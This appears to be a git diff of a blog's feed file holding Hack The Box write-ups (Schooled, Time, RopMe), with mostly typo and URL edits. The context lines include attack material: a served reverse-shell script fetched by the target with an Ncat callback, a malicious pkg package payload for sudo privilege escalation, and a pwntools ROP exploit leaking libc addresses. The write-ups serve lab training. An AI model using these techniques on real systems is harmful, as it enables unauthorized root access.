 10.10.10.234 - - [04/Apr/2021 14:11:32] &quot;GET /rev.ksh HTTP/1.1&quot; 200 -
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -104,6 +197,7 @@ Ncat: Connection from 10.10.10.234:33034.
     (ALL) NOPASSWD: /usr/sbin/pkg update
     (ALL) NOPASSWD: /usr/sbin/pkg install *
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;PKG has a config file:&lt;/p&gt;
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;jamie@Schooled:/etc/pkg % cat FreeBSD.conf
 &lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FreeBSD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
 &lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -121,11 +215,6 @@ FreeBSD: {
 	fingerprints: &quot;/usr/share/keys/pkg&quot;,
 	enabled: yes
 }
-jamie@Schooled:~ % cat /usr/share/keys/pkg/trusted/pkg.freebsd.org.2013102301
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FreeBSD&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;
-function: &quot;sha256&quot;
-fingerprint: &quot;b0170035af3acc5f3f3ae1859dc717101b4e6c1d0a794ad554928ca0cbb2f438&quot;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;To resolve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devops.htb&lt;/code&gt; it is probably added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;, and indeed it is:&lt;/p&gt;
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;jamie@Schooled:/etc % cat hosts
@@ -140,7 +229,7 @@ fingerprint: &quot;b0170035af3acc5f3f3ae1859dc717101b4e6c1d0a794ad554928ca0cbb2f
 192.168.1.14            devops.htb
 [snip]
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;And to my surprise, we as a member of the wheel group are have write access to that file!&lt;/p&gt;
+&lt;p&gt;And to my surprise, we, as a member of the wheel group, have write access to that file!&lt;/p&gt;
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;jamie@Schooled:/etc % ls -l hosts
 -rw-rw-r--  1 root  wheel  1098 Mar 17 15:47 hosts
 jamie@Schooled:/etc % id
@@ -166,9 +255,9 @@ So I changed&lt;/p&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;and executed quickly (the files will be deleted very frequently) the following steps:&lt;/p&gt;
 &lt;ul&gt;
-  &lt;li&gt;safe the &lt;a href=&quot;#fullExpl&quot;&gt;payload&lt;/a&gt; to /tmp/payload.sh&lt;/li&gt;
+  &lt;li&gt;save the &lt;a href=&quot;#fullExpl&quot;&gt;payload&lt;/a&gt; to /tmp/payload.sh&lt;/li&gt;
   &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh /tmp/payload.sh&lt;/code&gt; that creates the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/mypackage-1.0_5.txz&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;safe the edited &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; that contains my IP&lt;/li&gt;
+  &lt;li&gt;save the edited &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; that contains your IP&lt;/li&gt;
   &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo /usr/sbin/pkg install /tmp/mypackage-1.0_5.txz&lt;/code&gt; and confirm to install&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -271,7 +360,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;full-root-payload&quot;&gt;&lt;a href=&quot;#fullExpl&quot;&gt;Full root payload&lt;/a&gt;&lt;/h2&gt;
+&lt;h2 id=&quot;full-root-payload&quot;&gt;&lt;a name=&quot;fullExpl&quot;&gt;&lt;/a&gt;Full root payload&lt;/h2&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
 
 &lt;span class=&quot;nv&quot;&gt;STAGEDIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/stage
@@ -311,7 +400,7 @@ pkg query &lt;span class=&quot;s2&quot;&gt;&quot;  %n: { version: &lt;/span&gt;&
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/etc/my.conf&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STAGEDIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/plist
 
 pkg create &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STAGEDIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STAGEDIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/ &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STAGEDIR&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/plist &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="freebsd" /><category term="bsd" /><category term="moodle" /><category term="pkg" /><summary type="html">Write-up of the box Schooled from Hack The Box</summary></entry><entry><title type="html">Write-up: HackTheBox - Time</title><link href="http://localhost:4000/boxes/Time/" rel="alternate" type="text/html" title="Write-up: HackTheBox - Time" /><published>2021-04-02T21:33:36-04:00</published><updated>2021-04-02T21:33:36-04:00</updated><id>http://localhost:4000/boxes/Time</id><content type="html" xml:base="http://localhost:4000/boxes/Time/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="protected" /><category term="freebsd" /><category term="bsd" /><category term="moodle" /><category term="pkg" /><summary type="html">Schooled is a FreeBSD box that I enjoyed greatly.</summary></entry><entry><title type="html">Write-up: HackTheBox - Time</title><link href="https://vpm.rocks/boxes/Time/" rel="alternate" type="text/html" title="Write-up: HackTheBox - Time" /><published>2021-04-02T21:33:36-04:00</published><updated>2021-04-02T21:33:36-04:00</updated><id>https://vpm.rocks/boxes/Time</id><content type="html" xml:base="https://vpm.rocks/boxes/Time/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p&gt;This is a brief walkthrough for the box &lt;a href=&quot;https://app.hackthebox.eu/machines/Time&quot;&gt;Time&lt;/a&gt; from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt; with some remarks on &lt;a href=&quot;#permissions&quot;&gt;file/directory permissions&lt;/a&gt; in the appendix.&lt;/p&gt;
 &lt;h1 id=&quot;getting-a-shell-on-the-box-user-flag&quot;&gt;Getting a shell on the box, user flag&lt;/h1&gt;
 &lt;p&gt;&lt;a href=&quot;/assets/images/time/web_page.png&quot;&gt;&lt;img src=&quot;/assets/images/time/web_page.png&quot; alt=&quot;web&quot; height=&quot;360px&quot; width=&quot;180px&quot; class=&quot;align-right&quot; /&gt;&lt;/a&gt;
@@ -449,7 +538,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="linux" /><summary type="html">Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.</summary></entry><entry><title type="html">Write-up: HackThebox - RopMe</title><link href="http://localhost:4000/challenges/RopMe/" rel="alternate" type="text/html" title="Write-up: HackThebox - RopMe" /><published>2020-09-19T02:14:00-04:00</published><updated>2020-09-19T02:14:00-04:00</updated><id>http://localhost:4000/challenges/RopMe</id><content type="html" xml:base="http://localhost:4000/challenges/RopMe/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="linux" /><summary type="html">Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.</summary></entry><entry><title type="html">Write-up: HackThebox - RopMe</title><link href="https://vpm.rocks/challenges/RopMe/" rel="alternate" type="text/html" title="Write-up: HackThebox - RopMe" /><published>2020-09-19T02:14:00-04:00</published><updated>2020-09-19T02:14:00-04:00</updated><id>https://vpm.rocks/challenges/RopMe</id><content type="html" xml:base="https://vpm.rocks/challenges/RopMe/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Running the binary just asks us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP me outside, how 'about dah?&lt;/code&gt; which hints at &lt;ins&gt;r&lt;/ins&gt;eturn &lt;ins&gt;o&lt;/ins&gt;riented &lt;ins&gt;p&lt;/ins&gt;rogramming (ROP) - redirecting code execution by abusing a buffer overflow vulnerability. And indeed, when hammering the input with a lot of characters we get a seg fault:&lt;/p&gt;
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;./ropme
 &lt;span class=&quot;go&quot;&gt;ROP me outside, how 'about dah?
@@ -505,7 +594,7 @@ Now onto the binary. Looking at the code in &lt;code class=&quot;language-plaint
 
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline_contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# Sufficiently large byte string
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;				&lt;span class=&quot;c1&quot;&gt;# If this pause() has been reached, we run gdb -p $(pidof ropme)
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -534,17 +623,17 @@ Now onto the binary. Looking at the code in &lt;code class=&quot;language-plaint
 &lt;span class=&quot;gp&quot;&gt;0000000000400626 &amp;lt;main&amp;gt;&lt;/span&gt;:
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;This leads to a payload of&lt;/p&gt;
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4004e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;# p64 for 64-bit and correct endianess
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400626&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leaked puts address: 0x%x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;So after the junk, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; will load the subsequent address into the RDI register, which is the address of puts in the GOT and this is the address that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; will print when called - so we add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts_plt&lt;/code&gt;.
@@ -602,7 +691,7 @@ spawn.sh
 &lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;docker.hackthebox.eu&quot;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30948&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4004e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400626&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -612,13 +701,13 @@ spawn.sh
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline_contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_main&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# calls main after 1st return
 &lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# Part one
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;leaked_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span 